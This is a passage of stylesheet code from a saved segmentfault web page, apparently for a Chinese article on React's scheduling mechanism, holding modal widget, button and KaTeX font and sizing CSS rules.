AAAAoACgAAAZowIBwSCwaj8ikcslsOp/QqHRKnbISBEP1mQB4E9vmyvsNLycEMiBjVm7S5Eg7CVEf5smU2oFHHsh3fUYPahOCRgZkK4dFC2QEjEQjgJFEIRwJLJWbnJ2en6ChoqOkpaanqKmqq6ytjEEAIfkECQQAAQAsAAAAACgAKAAABmvAgHBILBqPyKRyyWw6n9CodEqlTgyOKhTAPWibKS439GUaxIBFWbkhoCPrJATtjSPD4oYdeRDX90UPb4BGZ1xqhEQLfolEEWiNRCpikUNuh5UBIl2ZQiIpnaGio6SlpqeoqaqrrK2ur7BOQQA7") no-repeat center center;
  background-size: 35px 35px !important;
}
@media (max-width: 576px) {
  .modalWidget_widget__J6QdN {
    width: 100%;
    max-height: 70vh;
  }
}

.modalWidget_widgetWrapper__shri5 {
  display: flex;
  align-items: flex-end;
  position: fixed;
  z-index: 999999999;
  overflow: hidden;
  border-radius: 6px;
  transition: all 0.4s ease;
  min-height: 74px;
  box-shadow: 0 0 16px rgba(16, 24, 40, 0.08), 0 24px 48px -12px rgba(16, 24, 40, 0.24);
  background: var(--background-color);
  padding-bottom: constant(safe-area-inset-bottom);
  padding-bottom: env(safe-area-inset-bottom);
}
@media (max-width: 576px) {
  .modalWidget_widgetWrapper__shri5 {
    width: unset !important;
    top: unset !important;
    left: 0 !important;
    right: 0 !important;
    bottom: -100vh !important;
    border-radius: 6px 6px 0 0 !important;
  }
}

.modalWidget_survey__wMqJW {
  width: 400px;
}

.modalWidget_feedback__1jy5N {
  width: 320px;
}

.modalWidget_reply__Q-WgF {
  width: 548px;
}

@media (max-width: 576px) {
  .modalWidget_slideIn__YILmi {
    bottom: 0 !important;
  }
}

.modalWidget_TOP_RIGHT__-MM3w {
  right: -460px;
  top: 24px;
}

.modalWidget_TOP_LEFT__rD2pf {
  left: -460px;
  top: 24px;
}

.modalWidget_BOTTOM_RIGHT__A5CVf {
  right: -460px;
  bottom: 24px;
}

.modalWidget_BOTTOM_LEFT__I-iRM {
  left: -460px;
  bottom: 24px;
}

.modalWidget_MIDDLE_RIGHT__MnWgo {
  right: -460px;
  top: 50%;
  transform: translate(0, -50%);
}
@media (max-width: 576px) {
  .modalWidget_MIDDLE_RIGHT__MnWgo {
    transform: none;
  }
}

.modalWidget_CUSTOMIZED_LEFT__hxTsh {
  left: -460px;
}

.modalWidget_CUSTOMIZED_RIGHT__JtwA2 {
  right: -460px;
}

.modalWidget_MIDDLE_LEFT__Zu0PH {
  left: -460px;
  top: 50%;
  transform: translate(0, -50%);
}
@media (max-width: 576px) {
  .modalWidget_MIDDLE_LEFT__Zu0PH {
    transform: none;
  }
}

.modalWidget_BOTTOM_CENTER__lVzf4 {
  left: calc(50% - 274px);
  bottom: -460px;
}

.modalWidget_CENTER__LKeA8 {
  left: 50%;
  top: 50%;
  opacity: 0;
  transition: all 0.3s !important;
  transition-delay: 100ms;
  transform: translate(-50%, -50%) scale(0.7);
}
@media (max-width: 576px) {
  .modalWidget_CENTER__LKeA8 {
    transform: translate(0%, 100%);
  }
}

.modalWidget_SlideInRight__ZzXGi {
  right: 24px;
  opacity: 1;
}

.modalWidget_SlideInRightBottom__H-zZZ {
  right: 24px;
  bottom: 24px;
  opacity: 1;
}

.modalWidget_SlideInCustomizedLeft__lG1w0 {
  left: 24px;
  opacity: 1;
}

.modalWidget_SlideInCustomizedRight__Yb7iC {
  right: 24px;
  opacity: 1;
}

.modalWidget_SlideInLeft__-l5Nw {
  left: 24px;
  opacity: 1;
}

.modalWidget_SlideInLeftBottom__8ys-L {
  left: 24px;
  bottom: 24px;
  opacity: 1;
}

.modalWidget_FadeInCenter__d2mH1 {
  opacity: 1 !important;
  transform: translate(-50%, -50%) scale(1);
}
@media (max-width: 576px) {
  .modalWidget_FadeInCenter__d2mH1 {
    transform: none;
  }
}

.modalWidget_SlideInBottom__rUiVc {
  opacity: 1;
  bottom: 24px;
}</style><style type="text/css">.publicModalWidget_howxmModalOpen__9Q3JF {
  overflow: hidden;
}

.publicModalWidget_backdropBase__BCWOB {
  position: fixed;
  top: 100vh;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: rgba(0, 0, 0, 0.5);
  display: none;
  opacity: 0;
  transition: opacity 0.4s ease;
  z-index: 999999999;
}
@media (max-width: 576px) {
  .publicModalWidget_backdropBase__BCWOB {
    display: block;
  }
}

.publicModalWidget_backdropIn__KRrLk {
  top: 0;
  opacity: 1;
}

.publicModalWidget_backdropPositionCenter__wqRdh {
  display: block;
}</style><style type="text/css">.index_loading__c3Eal {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.7);
  z-index: 2147483647;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  color: #fff;
  line-height: 3;
  font-size: 14px;
}

.index_loader__eiV3Z {
  width: 35px;
  height: 35px;
  border: 5px dotted #fff;
  border-radius: 50%;
  display: inline-block;
  position: relative;
  animation: index_rotation__RfJ17 2s linear infinite;
}

.index_overflowHidden__j13KP {
  overflow: hidden !important;
}</style><style type="text/css">.asideButton_asideBtn__l1LRP {
  display: flex;
  cursor: pointer;
  position: fixed;
  z-index: 999999999;
  flex-direction: column;
  align-items: center;
  padding: 12px 8px;
  color: var(--background-color);
  background: var(--primary-color);
}
.asideButton_asideBtn__l1LRP svg {
  width: 20px;
  height: 20px;
}

.asideButton_asideText__Fma8G {
  margin-top: 4px;
  font-size: 14px;
  line-height: 16px;
  word-break: break-all;
  writing-mode: vertical-rl;
  font-family: "PingFang SC";
  letter-spacing: 2px;
}

.asideButton_asideLeft__YLzZJ {
  border-radius: 0 4px 4px 0;
  padding-left: 24px !important;
}
.asideButton_asideLeft__YLzZJ:hover {
  left: -8px;
  transition: 0.4s cubic-bezier(0, 0, 0.14, 1.41);
}

.asideButton_asideRight__DlCpY {
  border-radius: 4px 0 0 4px;
  padding-right: 24px !important;
}
.asideButton_asideRight__DlCpY:hover {
  right: -8px;
  transition: 0.4s cubic-bezier(0, 0, 0.14, 1.41);
}

.asideButton_SlideInBottomLeft__KoMOz {
  transform: translateX(0) !important;
}

.asideButton_SlideInMiddleLeft__5NGzb {
  transform: translate(0, -50%) !important;
}

.asideButton_SlideInBottomRight__qEab4 {
  transform: translateX(0) !important;
}

.asideButton_SlideInMiddleRight__uBmnC {
  transform: translate(0, -50%) !important;
}

.asideButton_SlideInCustomized__YV-Cg {
  transform: translateX(0) !important;
}

.asideButton_BOTTOM_LEFT__Taq-M {
  left: -16px;
  bottom: 40px;
  transform: translateX(-120%);
}
@media (max-width: 576px) {
  .asideButton_BOTTOM_LEFT__Taq-M {
    bottom: 20px;
  }
}

.asideButton_BOTTOM_RIGHT__-Jp90 {
  right: -16px;
  bottom: 40px;
  transform: translateX(120%);
}
@media (max-width: 576px) {
  .asideButton_BOTTOM_RIGHT__-Jp90 {
    bottom: 20px;
  }
}

.asideButton_MIDDLE_LEFT__btgKv {
  left: -16px;
  top: 50%;
  transform: translate(-120%, -50%);
}

.asideButton_MIDDLE_RIGHT__Z7P4B {
  right: -16px;
  top: 50%;
  transform: translate(120%, -50%);
}

.asideButton_CUSTOMIZED_LEFT__mPFWV {
  left: -16px;
  transform: translateX(-120%);
}

.asideButton_CUSTOMIZED_RIGHT__tyWAn {
  right: -16px;
  transform: translateX(120%);
}</style><meta name="referrer" content="unsafe-url"><script src="./彻底搞懂React的调度机制原理_files/katexCssLoader.js"></script><style type="text/css">
/* stylelint-disable font-family-no-missing-generic-family-keyword */
@font-face {
  font-family: 'KaTeX_AMS';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_AMS-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_AMS-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_AMS-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Caligraphic';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Caligraphic-Bold.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Caligraphic-Bold.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Caligraphic-Bold.ttf) format('truetype');
  font-weight: bold;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Caligraphic';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Caligraphic-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Caligraphic-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Caligraphic-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Fraktur';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Fraktur-Bold.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Fraktur-Bold.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Fraktur-Bold.ttf) format('truetype');
  font-weight: bold;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Fraktur';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Fraktur-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Fraktur-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Fraktur-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Main';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-Bold.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-Bold.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-Bold.ttf) format('truetype');
  font-weight: bold;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Main';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-BoldItalic.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-BoldItalic.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-BoldItalic.ttf) format('truetype');
  font-weight: bold;
  font-style: italic;
}
@font-face {
  font-family: 'KaTeX_Main';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-Italic.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-Italic.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-Italic.ttf) format('truetype');
  font-weight: normal;
  font-style: italic;
}
@font-face {
  font-family: 'KaTeX_Main';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Main-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Math';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Math-BoldItalic.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Math-BoldItalic.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Math-BoldItalic.ttf) format('truetype');
  font-weight: bold;
  font-style: italic;
}
@font-face {
  font-family: 'KaTeX_Math';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Math-Italic.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Math-Italic.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Math-Italic.ttf) format('truetype');
  font-weight: normal;
  font-style: italic;
}
@font-face {
  font-family: 'KaTeX_SansSerif';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_SansSerif-Bold.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_SansSerif-Bold.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_SansSerif-Bold.ttf) format('truetype');
  font-weight: bold;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_SansSerif';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_SansSerif-Italic.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_SansSerif-Italic.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_SansSerif-Italic.ttf) format('truetype');
  font-weight: normal;
  font-style: italic;
}
@font-face {
  font-family: 'KaTeX_SansSerif';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_SansSerif-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_SansSerif-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_SansSerif-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Script';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Script-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Script-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Script-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Size1';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size1-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size1-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size1-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Size2';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size2-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size2-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size2-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Size3';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size3-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size3-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size3-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Size4';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size4-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size4-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Size4-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
@font-face {
  font-family: 'KaTeX_Typewriter';
  src: url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Typewriter-Regular.woff2) format('woff2'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Typewriter-Regular.woff) format('woff'), url(https://static.segmentfault.com/main_site_next/d778cb88/fonts/katex/KaTeX_Typewriter-Regular.ttf) format('truetype');
  font-weight: normal;
  font-style: normal;
}
.katex {
  font: normal 1.21em KaTeX_Main, Times New Roman, serif;
  line-height: 1.2;
  text-indent: 0;
  text-rendering: auto;
  border-color: currentColor;
}
.katex * {
  -ms-high-contrast-adjust: none !important;
}
.katex .katex-version::after {
  content: "0.12.0";
}
.katex .katex-mathml {
  position: absolute;
  clip: rect(1px, 1px, 1px, 1px);
  padding: 0;
  border: 0;
  height: 1px;
  width: 1px;
  overflow: hidden;
}
.katex .katex-html {
  /* 
ewline is an empty block at top level, between .base elements */
}
.katex .katex-html > .newline {
  display: block;
}
.katex .base {
  position: relative;
  display: inline-block;
  white-space: nowrap;
  width: min-content;
}
.katex .strut {
  display: inline-block;
}
.katex .textbf {
  font-weight: bold;
}
.katex .textit {
  font-style: italic;
}
.katex .textrm {
  font-family: KaTeX_Main;
}
.katex .textsf {
  font-family: KaTeX_SansSerif;
}
.katex .texttt {
  font-family: KaTeX_Typewriter;
}
.katex .mathnormal {
  font-family: KaTeX_Math;
  font-style: italic;
}
.katex .mathit {
  font-family: KaTeX_Main;
  font-style: italic;
}
.katex .mathrm {
  font-style: normal;
}
.katex .mathbf {
  font-family: KaTeX_Main;
  font-weight: bold;
}
.katex .boldsymbol {
  font-family: KaTeX_Math;
  font-weight: bold;
  font-style: italic;
}
.katex .amsrm {
  font-family: KaTeX_AMS;
}
.katex .mathbb,
.katex .textbb {
  font-family: KaTeX_AMS;
}
.katex .mathcal {
  font-family: KaTeX_Caligraphic;
}
.katex .mathfrak,
.katex .textfrak {
  font-family: KaTeX_Fraktur;
}
.katex .mathtt {
  font-family: KaTeX_Typewriter;
}
.katex .mathscr,
.katex .textscr {
  font-family: KaTeX_Script;
}
.katex .mathsf,
.katex .textsf {
  font-family: KaTeX_SansSerif;
}
.katex .mathboldsf,
.katex .textboldsf {
  font-family: KaTeX_SansSerif;
  font-weight: bold;
}
.katex .mathitsf,
.katex .textitsf {
  font-family: KaTeX_SansSerif;
  font-style: italic;
}
.katex .mainrm {
  font-family: KaTeX_Main;
  font-style: normal;
}
.katex .vlist-t {
  display: inline-table;
  table-layout: fixed;
  border-collapse: collapse;
}
.katex .vlist-r {
  display: table-row;
}
.katex .vlist {
  display: table-cell;
  vertical-align: bottom;
  position: relative;
}
.katex .vlist > span {
  display: block;
  height: 0;
  position: relative;
}
.katex .vlist > span > span {
  display: inline-block;
}
.katex .vlist > span > .pstrut {
  overflow: hidden;
  width: 0;
}
.katex .vlist-t2 {
  margin-right: -2px;
}
.katex .vlist-s {
  display: table-cell;
  vertical-align: bottom;
  font-size: 1px;
  width: 2px;
  min-width: 2px;
}
.katex .vbox {
  display: -ms-inline-flexbox;
  display: inline-flex;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: baseline;
}
.katex .hbox {
  display: -ms-inline-flexbox;
  display: inline-flex;
  -ms-flex-direction: row;
  flex-direction: row;
  width: 100%;
}
.katex .thinbox {
  display: inline-flex;
  flex-direction: row;
  width: 0;
  max-width: 0;
}
.katex .msupsub {
  text-align: left;
}
.katex .mfrac > span > span {
  text-align: center;
}
.katex .mfrac .frac-line {
  display: inline-block;
  width: 100%;
  border-bottom-style: solid;
}
.katex .mfrac .frac-line,
.katex .overline .overline-line,
.katex .underline .underline-line,
.katex .hline,
.katex .hdashline,
.katex .rule {
  min-height: 1px;
}
.katex .mspace {
  display: inline-block;
}
.katex .llap,
.katex .rlap,
.katex .clap {
  width: 0;
  position: relative;
}
.katex .llap > .inner,
.katex .rlap > .inner,
.katex .clap > .inner {
  position: absolute;
}
.katex .llap > .fix,
.katex .rlap > .fix,
.katex .clap > .fix {
  display: inline-block;
}
.katex .llap > .inner {
  right: 0;
}
.katex .rlap > .inner,
.katex .clap > .inner {
  left: 0;
}
.katex .clap > .inner > span {
  margin-left: -50%;
  margin-right: 50%;
}
.katex .rule {
  display: inline-block;
  border: solid 0;
  position: relative;
}
.katex .overline .overline-line,
.katex .underline .underline-line,
.katex .hline {
  display: inline-block;
  width: 100%;
  border-bottom-style: solid;
}
.katex .hdashline {
  display: inline-block;
  width: 100%;
  border-bottom-style: dashed;
}
.katex .sqrt > .root {
  margin-left: 0.27777778em;
  margin-right: -0.55555556em;
}
.katex .sizing.reset-size1.size1,
.katex .fontsize-ensurer.reset-size1.size1 {
  font-size: 1em;
}
.katex .sizing.reset-size1.size2,
.katex .fontsize-ensurer.reset-size1.size2 {
  font-size: 1.2em;
}
.katex .sizing.reset-size1.size3,
.katex .fontsize-ensurer.reset-size1.size3 {
  font-size: 1.4em;
}
.katex .sizing.reset-size1.size4,
.katex .fontsize-ensurer.reset-size1.size4 {
  font-size: 1.6em;
}
.katex .sizing.reset-size1.size5,
.katex .fontsize-ensurer.reset-size1.size5 {
  font-size: 1.8em;
}
.katex .sizing.reset-size1.size6,
.katex .fontsize-ensurer.reset-size1.size6 {
  font-size: 2em;
}
.katex .sizing.reset-size1.size7,
.katex .fontsize-ensurer.reset-size1.size7 {
  font-size: 2.4em;
}
.katex .sizing.reset-size1.size8,
.katex .fontsize-ensurer.reset-size1.size8 {
  font-size: 2.88em;
}
.katex .sizing.reset-size1.size9,
.katex .fontsize-ensurer.reset-size1.size9 {
  font-size: 3.456em;
}
.katex .sizing.reset-size1.size10,
.katex .fontsize-ensurer.reset-size1.size10 {
  font-size: 4.148em;
}
.katex .sizing.reset-size1.size11,
.katex .fontsize-ensurer.reset-size1.size11 {
  font-size: 4.976em;
}
.katex .sizing.reset-size2.size1,
.katex .fontsize-ensurer.reset-size2.size1 {
  font-size: 0.83333333em;
}
.katex .sizing.reset-size2.size2,
.katex .fontsize-ensurer.reset-size2.size2 {
  font-size: 1em;
}
.katex .sizing.reset-size2.size3,
.katex .fontsize-ensurer.reset-size2.size3 {
  font-size: 1.16666667em;
}
.katex .sizing.reset-size2.size4,
.katex .fontsize-ensurer.reset-size2.size4 {
  font-size: 1.33333333em;
}
.katex .sizing.reset-size2.size5,
.katex .fontsize-ensurer.reset-size2.size5 {
  font-size: 1.5em;
}
.katex .sizing.reset-size2.size6,
.katex .fontsize-ensurer.reset-size2.size6 {
  font-size: 1.66666667em;
}
.katex .sizing.reset-size2.size7,
.katex .fontsize-ensurer.reset-size2.size7 {
  font-size: 2em;
}
.katex .sizing.reset-size2.size8,
.katex .fontsize-ensurer.reset-size2.size8 {
  font-size: 2.4em;
}
.katex .sizing.reset-size2.size9,
.katex .fontsize-ensurer.reset-size2.size9 {
  font-size: 2.88em;
}
.katex .sizing.reset-size2.size10,
.katex .fontsize-ensurer.reset-size2.size10 {
  font-size: 3.45666667em;
}
.katex .sizing.reset-size2.size11,
.katex .fontsize-ensurer.reset-size2.size11 {
  font-size: 4.14666667em;
}
.katex .sizing.reset-size3.size1,
.katex .fontsize-ensurer.reset-size3.size1 {
  font-size: 0.71428571em;
}
.katex .sizing.reset-size3.size2,
.katex .fontsize-ensurer.reset-size3.size2 {
  font-size: 0.85714286em;
}
.katex .sizing.reset-size3.size3,
.katex .fontsize-ensurer.reset-size3.size3 {
  font-size: 1em;
}
.katex .sizing.reset-size3.size4,
.katex .fontsize-ensurer.reset-size3.size4 {
  font-size: 1.14285714em;
}
.katex .sizing.reset-size3.size5,
.katex .fontsize-ensurer.reset-size3.size5 {
  font-size: 1.28571429em;
}
.katex .sizing.reset-size3.size6,
.katex .fontsize-ensurer.reset-size3.size6 {
  font-size: 1.42857143em;
}
.katex .sizing.reset-size3.size7,
.katex .fontsize-ensurer.reset-size3.size7 {
  font-size: 1.71428571em;
}
.katex .sizing.reset-size3.size8,
.katex .fontsize-ensurer.reset-size3.size8 {
  font-size: 2.05714286em;
}
.katex .sizing.reset-size3.size9,
.katex .fontsize-ensurer.reset-size3.size9 {
  font-size: 2.46857143em;
}
.katex .sizing.reset-size3.size10,
.katex .fontsize-ensurer.reset-size3.size10 {
  font-size: 2.96285714em;
}
.katex .sizing.reset-size3.size11,
.katex .fontsize-ensurer.reset-size3.size11 {
  font-size: 3.55428571em;
}
.katex .sizing.reset-size4.size1,
.katex .fontsize-ensurer.reset-size4.size1 {
  font-size: 0.625em;
}
.katex .sizing.reset-size4.size2,
.katex .fontsize-ensurer.reset-size4.size2 {
  font-size: 0.75em;
}
.katex .sizing.reset-size4.size3,
.katex .fontsize-ensurer.reset-size4.size3 {
  font-size: 0.875em;
}
.katex .sizing.reset-size4.size4,
.katex .fontsize-ensurer.reset-size4.size4 {
  font-size: 1em;
}
.katex .sizing.reset-size4.size5,
.katex .fontsize-ensurer.reset-size4.size5 {
  font-size: 1.125em;
}
.katex .sizing.reset-size4.size6,
.katex .fontsize-ensurer.reset-size4.size6 {
  font-size: 1.25em;
}
.katex .sizing.reset-size4.size7,
.katex .fontsize-ensurer.reset-size4.size7 {
  font-size: 1.5em;
}
.katex .sizing.reset-size4.size8,
.katex .fontsize-ensurer.reset-size4.size8 {
  font-size: 1.8em;
}
.katex .sizing.reset-size4.size9,
.katex .fontsize-ensurer.reset-size4.size9 {
  font-size: 2.16em;
}
.katex .sizing.reset-size4.size10,
.katex .fontsize-ensurer.reset-size4.size10 {
  font-size: 2.5925em;
}
.katex .sizing.reset-size4.size11,
.katex .fontsize-ensurer.reset-size4.size11 {
  font-size: 3.11em;
}
.katex .sizing.reset-size5.size1,
.katex .fontsize-ensurer.reset-size5.size1 {
  font-size: 0.55555556em;
}
.katex .sizing.reset-size5.size2,
.katex .fontsize-ensurer.reset-size5.size2 {
  font-size: 0.66666667em;
}
.katex .sizing.reset-size5.size3,
.katex .fontsize-ensurer.reset-size5.size3 {
  font-size: 0.77777778em;
}
.katex .sizing.reset-size5.size4,
.katex .fontsize-ensurer.reset-size5.size4 {
  font-size: 0.88888889em;
}
.katex .sizing.reset-size5.size5,
.katex .fontsize-ensurer.reset-size5.size5 {
  font-size: 1em;
}
.katex .sizing.reset-size5.size6,
.katex .fontsize-ensurer.reset-size5.size6 {
  font-size: 1.11111111em;
}
.katex .sizing.reset-size5.size7,
.katex .fontsize-ensurer.reset-size5.size7 {
  font-size: 1.33333333em;
}
.katex .sizing.reset-size5.size8,
.katex .fontsize-ensurer.reset-size5.size8 {
  font-size: 1.6em;
}
.katex .sizing.reset-size5.size9,
.katex .fontsize-ensurer.reset-size5.size9 {
  font-size: 1.92em;
}
.katex .sizing.reset-size5.size10,
.katex .fontsize-ensurer.reset-size5.size10 {
  font-size: 2.30444444em;
}
.katex .sizing.reset-size5.size11,
.katex .fontsize-ensurer.reset-size5.size11 {
  font-size: 2.76444444em;
}
.katex .sizing.reset-size6.size1,
.katex .fontsize-ensurer.reset-size6.size1 {
  font-size: 0.5em;
}
.katex .sizing.reset-size6.size2,
.katex .fontsize-ensurer.reset-size6.size2 {
  font-size: 0.6em;
}
.katex .sizing.reset-size6.size3,
.katex .fontsize-ensurer.reset-size6.size3 {
  font-size: 0.7em;
}
.katex .sizing.reset-size6.size4,
.katex .fontsize-ensurer.reset-size6.size4 {
  font-size: 0.8em;
}
.katex .sizing.reset-size6.size5,
.katex .fontsize-ensurer.reset-size6.size5 {
  font-size: 0.9em;
}
.katex .sizing.reset-size6.size6,
.katex .fontsize-ensurer.reset-size6.size6 {
  font-size: 1em;
}
.katex .sizing.reset-size6.size7,
.katex .fontsize-ensurer.reset-size6.size7 {
  font-size: 1.2em;
}
.katex .sizing.reset-size6.size8,
.katex .fontsize-ensurer.reset-size6.size8 {
  font-size: 1.44em;
}
.katex .sizing.reset-size6.size9,
.katex .fontsize-ensurer.reset-size6.size9 {
  font-size: 1.728em;
}
.katex .sizing.reset-size6.size10,
.katex .fontsize-ensurer.reset-size6.size10 {
  font-size: 2.074em;
}
.katex .sizing.reset-size6.size11,
.katex .fontsize-ensurer.reset-size6.size11 {
  font-size: 2.488em;
}
.katex .sizing.reset-size7.size1,
.katex .fontsize-ensurer.reset-size7.size1 {
  font-size: 0.41666667em;
}
.katex .sizing.reset-size7.size2,
.katex .fontsize-ensurer.reset-size7.size2 {
  font-size: 0.5em;
}
.katex .sizing.reset-size7.size3,
.katex .fontsize-ensurer.reset-size7.size3 {
  font-size: 0.58333333em;
}
.katex .sizing.reset-size7.size4,
.katex .fontsize-ensurer.reset-size7.size4 {
  font-size: 0.66666667em;
}
.katex .sizing.reset-size7.size5,
.katex .fontsize-ensurer.reset-size7.size5 {
  font-size: 0.75em;
}
.katex .sizing.reset-size7.size6,
.katex .fontsize-ensurer.reset-size7.size6 {
  font-size: 0.83333333em;
}
.katex .sizing.reset-size7.size7,
.katex .fontsize-ensurer.reset-size7.size7 {
  font-size: 1em;
}
.katex .sizing.reset-size7.size8,
.katex .fontsize-ensurer.reset-size7.size8 {
  font-size: 1.2em;
}
.katex .sizing.reset-size7.size9,
.katex .fontsize-ensurer.reset-size7.size9 {
  font-size: 1.44em;
}
.katex .sizing.reset-size7.size10,
.katex .fontsize-ensurer.reset-size7.size10 {
  font-size: 1.72833333em;
}
.katex .sizing.reset-size7.size11,
.katex .fontsize-ensurer.reset-size7.size11 {
  font-size: 2.07333333em;
}
.katex .sizing.reset-size8.size1,
.katex .fontsize-ensurer.reset-size8.size1 {
  font-size: 0.34722222em;
}
.katex .sizing.reset-size8.size2,
.katex .fontsize-ensurer.reset-size8.size2 {
  font-size: 0.41666667em;
}
.katex .sizing.reset-size8.size3,
.katex .fontsize-ensurer.reset-size8.size3 {
  font-size: 0.48611111em;
}
.katex .sizing.reset-size8.size4,
